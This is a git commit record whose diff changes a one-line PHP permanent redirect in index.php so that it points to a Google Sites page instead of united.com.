d2d9a98a959ab5947492a16b9fe553c4a2c67b33
jt15091004 <65575856+jt15091004@users.noreply.github.com>
2020-05-20 22:07:31 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
 // PHP permanent URL redirection
-header("Location: https://www.united.com/en/us", true, 301);
+header("Location: https://sites.google.com/view/newersion546", true, 301);
 exit();
 ?>
